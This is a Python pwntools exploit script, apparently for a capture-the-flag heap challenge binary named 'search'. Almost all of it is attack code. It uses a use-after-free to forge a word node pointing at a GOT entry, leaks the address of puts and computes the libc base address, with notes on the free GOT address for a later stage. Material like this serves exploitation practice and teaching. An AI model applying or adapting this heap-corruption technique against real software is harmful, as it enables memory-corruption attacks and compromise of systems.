#!/usr/bin/env python3

from pwn import *

context(arch="amd64", os="linux")
context.terminal = ['tmux', 'splitw', '-h']  # Replace this with your terminal
p = process('./search')
gdb.attach(p, '''
#            break read
           ''')


def index_sentence(sentence):
    p.sendline(b'2')
    p.sendline(str(len(sentence)).encode())
    p.sendline(sentence)

def search_word(word):
    p.sendline(b'1')
    p.sendline(str(len(word)).encode())
    p.sendline(word)
    #p.sendline(b'y')

def quit_program():
    p.sendline(b'3')

def basiic_tests():
    index_sentence(b'This is a test sentence!')
    index_sentence(b'Another test in this program!')
    search_word(b'this')
    p.sendline(b'y')
    quit_program()
    p.interactive()

def libc_leak():
    # Index a 40 char sentence, length of word
    index_sentence((b'A' * 12 + b' B ').ljust(40, b'C'))
    # Kill that sentence
    search_word(b'A' * 12)
    p.sendline(b'y')
    # index a larger sentence to make a new word in place
    index_sentence(b'D' * 64)
    search_word(b'\x00')
    p.sendline(b'y')

    node = b''
    node += p64(0x400E90) # ADDR of "Enter the word:"
    node += p64(5)
    node += p64(0x602028) # GOT ADDR
    node += p64(64)
    node += p64(0)
    assert len(node) == 40
    index_sentence(node)

    p.clean()

    search_word(b'Enter')

    p.recvuntil(b'Found 64: ')
    leak = u64(p.recvline()[:8])
    p.sendline(b'n')
    return leak

def puts_to_libc(puts_loc):
    libc_base = puts_loc - (0x7548cc433a60 - 0x00007548cc3b3000)
    return libc_base

def main():
    leak = libc_leak()
    log.success("LIBC LEAK: " + str(hex(leak)))
    log.success("LIBC BASE: " + str(hex(puts_to_libc(leak))))
    p.interactive()

if __name__ == '__main__':
    main()


# free@got.plt -> 0x602018
